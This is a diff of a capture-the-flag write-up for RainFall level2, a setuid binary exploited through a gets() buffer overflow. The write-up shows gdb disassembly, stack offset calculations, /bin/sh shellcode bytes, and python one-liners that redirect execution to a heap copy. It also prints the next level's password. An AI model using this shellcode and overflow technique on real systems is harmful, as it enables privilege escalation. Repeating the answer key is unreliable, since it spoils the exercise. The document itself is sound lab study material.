@@ -20,7 +20,7 @@ level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
 
 The file is owned by **level3** and has the **setuid** bit.
 
-We list the functions inside the executable and analyze their assembly code with **GDB**.
+We list the functions inside the executable.
 
 ```
 (gdb) info functions
@@ -56,7 +56,7 @@ Non-debugging symbols:
 0x080485fc  _fini
 ```
 
-There are 2 interesting functions: `main()` and `p()`.
+There are 2 user-defined functions: `main()` and `p()`.
 
 ```
 (gdb) disas main
@@ -70,7 +70,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-The `main()` function only calls the `p()` function.
+The `main()` function calls the `p()` function.
 
 ```
 (gdb) disas p
@@ -108,44 +108,55 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-The `run()` function:
-- decrements the stack pointer by `0x68` bytes
-- calls `gets()` with the start of the buffer set to `ebp - 0x4c`
-- performs a bitwise `AND` operation on a copy of `eip` moved to `eax`
-- compares the previous value with `0xb0000000` and exits if they are equal
-- calls `puts()` with the top of the stack pointer passed as first argument
-- calls `strdup()` with the top of the stack pointer passed as first argument
+The `p()` function:
+- calls `gets()` and stores user input to `[ebp - 0x4c]`
+- performs a bitwise `AND` operation on a copy of `old eip` located in `[ebp + 0x4]`, then compares it with `0xb0000000` and calls `exit()` if they are equal
+- calls `puts()` to print `gets()` buffer
+- calls `strdup()` to allocate a copy of the `gets()` buffer on the heap
 
-Like in the previous level, we can exploit the executable with a **buffer overflow**, because no validation is performed in order to prevent the user from entering more than x characters during `gets()`.  
-But there is no declared function to run in order to spawn a shell: we have to create our own shellcode.
+Like in the previous level, we can exploit the executable with a **buffer overflow**, because no validation is performed in order to prevent the user from entering more than x characters during `gets()` and overwrite `old eip`.  
+But there is no declared function to run in order to spawn a shell: we have to create our own **shellcode**.
 
-In order to simplify the calculation of the required number of characters to input, we draw a diagram of the stack.
+We draw a diagram of the `p()` stack frame.
 
-![Stack diagram](./resources/level2_stack-diagram.png)
+![Stack diagram](./resources/level2_diagram1.png)
 
-108 - 28 = 80 bytes.
 
-We create a **Python** script whichs:
-- inserts a payload of 80 characters
-- overrides `eip` with the address in memory of `eip` incremented by 4 bytes ([detailled explanation](#find-the-current-address-of-eip))
-- inserts a **shellcode** that will be called thanks to the address stored in `eip`
+We calculate the difference between the `old eip` in the stack and the `gets()` buffer: 108 - 28 = 80 bytes.
 
-```python
-payload = "\x41" * 80
-eip = "\x40\xf6\xff\xbf"
-shellcode = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
+We run a **Python** script whichs writes to stdin:
+- a **shellcode** that will be called thanks to the address replaced in `old eip`
+- a payload of x characters to write a total of 80 characters
+- the address of `[ebp - 0x4c]`, which is the pointer passed to `gets()`, where our shellcode will be stored
 
-print payload + eip + shellcode
+We find the address of `[ebp - 0x4c]` by setting a breakpoint before `gets()` in order to catch the address on the top of stack: the first argument passed to the called function.
+
+```
+(gdb) b *0x080484ed
+Breakpoint 1 at 0x80484ed
+(gdb) r
+Starting program: /home/user/level2/level2 
+
+Breakpoint 1, 0x080484ed in p ()
+(gdb) i r esp
+esp            0xbffff5d0       0xbffff5d0
+(gdb) x 0xbffff5d0
+0xbffff5d0:     0xbffff5ec
 ```
 
+The address of `[ebp - 0x4c]` is `0xbffff5ec`.
+
 ```bash
-level2@RainFall:~$ (python /tmp/level2/script.py; cat) | ./level2 
-(0xbffff640)
+level2@RainFall:~$ (python -c "print('\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80' + 'A' * 55 + '\xec\xf5\xff\xbf')"; cat) | ./level2 
+(0xbffff5ec)
 whoami
 ```
 
-Unfortunately our script doesn't work ([detailled explanation](#why-our-first-script-is-not-working)).  
-Because all the adjacent memory addresses start with `0xbf`, we are unable to use them for storing our shellcode. After reviewing the `p()` function, we notice that it is calling `strdup()` which in return calls `malloc()` and so allocates memory on the **heap**. We use the `ltrace` command to intercept the library calls and get the location in memory of our duplicated string.
+Unfortunately our script doesn't work because of the comparison done in the `p()` function.  
+It checks if `old eip` starts with `0xb` and calls `exit()` if it's the case. Because the address of `[ebp - 0x4c]` is `0xbffff5ec`, the result of the comparison is true. And we cannot use an adjacent memory address in order to store our shellcode, because they all start with `0xb`.
+
+After reviewing the `p()` function, we notice that it is calling `strdup()` which in return calls `malloc()` and so allocates memory on the **heap**, which addresses are not close to the stack.  
+We use the `ltrace` command to intercept the library calls and get the location in memory of our duplicated string.
 
 ```bash
 level2@RainFall:~$ ltrace ./level2 
@@ -159,19 +170,10 @@ strdup("")                                                                      
 +++ exited (status 8) +++
 ```
 
-We rewrite the previous script in order to account for the changes: the shellcode is directly printed into the buffer, followed by x placeholder characters, and ended by the address in the **heap** of the string.
-
-```python
-shellcode = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
-shellcode_len = len(shellcode)
-pad = "\x41" * (80 - shellcode_len)
-eip = "\x08\xa0\x04\x08"
-
-print shellcode + pad + eip
-```
+We rewrite the previous command in order to account for the changes: `0xbffff5ec` is replaced by `0x0804a008`.
 
 ```bash
-level2@RainFall:~$ (python /tmp/level2.py; cat) | ./level2
+level2@RainFall:~$ (python -c "print('\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80' + 'A' * 55 + '\x08\xa0\x04\x08')"; cat) | ./level2 
 ���//sh�/binQVW�$�
                   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 whoami
@@ -179,53 +181,6 @@ level3
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
-
-## Additional information
-
-### Find the current address of `eip`
-
-We use the `info frame` command from **GDB** in order to display advanced information about a stack frame.
-
-```
-(gdb) break p
-Breakpoint 1 at 0x80484da
-(gdb) r
-Starting program: /home/user/level2/level2 
-
-Breakpoint 1, 0x080484da in p ()
-(gdb) info frame
-Stack level 0, frame at 0xbffff640:
- eip = 0x80484da in p; saved eip 0x804854a
- called by frame at 0xbffff650
- Arglist at 0xbffff638, args: 
- Locals at 0xbffff638, Previous frame's sp is 0xbffff640
- Saved registers:
-  ebp at 0xbffff638, eip at 0xbffff63c
-```
-
-The `eip` register is stored at address `0xbffff63c`.  
-Because we are gonna write past this address thanks to the **buffer overflow**, we increment it by 4 bytes to know where our shellcode will be written to: `0xbffff63c` + 4 = `0xbffff640`.
-
-### Why our first script is not working
-
-In our first script, we are overriding `eip` with `0xbffff640` but it passes the condition written below, and therefore calls `exit()`, instead of continuing the execution.
-
-```
-   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]
-   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax
-   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]
-   0x080484fb <+39>:    and    eax,0xb0000000
-   0x08048500 <+44>:    cmp    eax,0xb0000000
-   0x08048505 <+49>:    jne    0x8048527 <p+83>
-```
-
-| Information | Hexadecimal | Binary |
-| --- | --- | --- |
-| Address of our shellcode | 0xbffff640 | 10111111111111111111011001000000 |
-| `AND` second operand | 0xb0000000 | 10110000000000000000000000000000 |
-| After `AND` | 0xbffff640 | 10110000000000000000000000000000 |
-
-As a result of this `AND` operation, our address is indeed equal to `0xb0000000` and passes the condition.
 
 ## Resources
 
